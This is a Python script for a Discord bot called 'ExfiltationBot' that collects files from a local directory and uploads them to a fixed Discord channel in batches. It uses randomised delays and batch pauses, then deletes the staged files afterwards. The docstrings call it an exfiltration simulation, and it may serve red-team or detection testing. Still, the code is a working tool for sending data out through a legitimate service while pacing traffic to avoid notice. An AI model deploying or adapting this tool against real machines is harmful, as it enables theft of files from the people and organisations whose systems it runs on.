import os
import asyncio
import discord
from discord.ext import commands
from dotenv import load_dotenv
from random import random, randint
from support_library import get_token, gather_files, clean_files



CHANNEL_ID = 1298955028597440555  # Replace with the actual channel ID

class ExfiltationBot(discord.Client):
    def __init__(self, sleep_intervals_seconds, batch_interval_seconds, max_files_per_batch, exfiltrated_files_directory, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sleep_intervals_seconds = sleep_intervals_seconds
        self.batch_interval_seconds = batch_interval_seconds
        self.max_files_per_batch = max_files_per_batch
        self.exfiltrated_files_directory = exfiltrated_files_directory

    async def on_ready(self):
        print(f'Logged in as {self.user}')
        print(f'Starting exfiltration simulation...')
        await self.exfiltrate_data()

    async def exfiltrate_data(self):
        """
        Simulate exfiltrating data by sending files to a Discord channel.
        """
        channel = self.get_channel(CHANNEL_ID)
        if not channel:
            print("Channel not found. Ensure the CHANNEL_ID is correct.")
            return

        # Gather all files to send
        file_paths = gather_files(self.exfiltrated_files_directory)

        # File list is empty
        if not file_paths:
            print(f"No files found in {self.exfiltrated_files_directory}, closing the bot.")
            await self.close()
            return

        # Send all files
        await self.handle_batch(channel, file_paths)

        print(f"Cleaning all the split files from {self.exfiltrated_files_directory}.")

        # Cleanup split files
        clean_files(self.exfiltrated_files_directory)

        print("Closing the bot.")
        await self.close()

    async def send_file(self, channel, file_path):
        """Send a single file to the channel."""
        await channel.send("Here is your attachment:", file=discord.File(file_path))
        print(f"Sent {file_path} with {os.path.getsize(file_path) / 1024 ** 2:.2f} MB.")

    async def handle_batch(self, channel, file_paths):
        """Handle file sending in batches."""
        files_sent = 0
        for file_path in file_paths:
            await self.send_file(channel, file_path)
            files_sent += 1

            if files_sent >= self.max_files_per_batch:
                print(f"Batch limit reached. Sleeping for {self.batch_interval_seconds} seconds.")
                await asyncio.sleep(self.batch_interval_seconds)
                files_sent = 0
                continue

            await asyncio.sleep(
                self.sleep_intervals_seconds[0]
                + random() * (self.sleep_intervals_seconds[1] - self.sleep_intervals_seconds[0])
            )

# Main Script
if __name__ == "__main__":

    configurations = {
        "sleep_interval_seconds": (1, 3),
        "batch_interval_seconds": 20,
        "max_files_per_batch": 5,
        "path": "data"
    }

    DISCORD_TOKEN = get_token("DISCORD_TOKEN")

    intents = discord.Intents.default()
    intents.messages = True


    bot = ExfiltationBot(
        sleep_intervals_seconds=configurations["sleep_interval_seconds"],
        batch_interval_seconds=configurations["batch_interval_seconds"],
        max_files_per_batch=configurations["max_files_per_batch"],
        exfiltrated_files_directory=configurations["path"],
        intents=intents
    )

    bot.run(DISCORD_TOKEN)
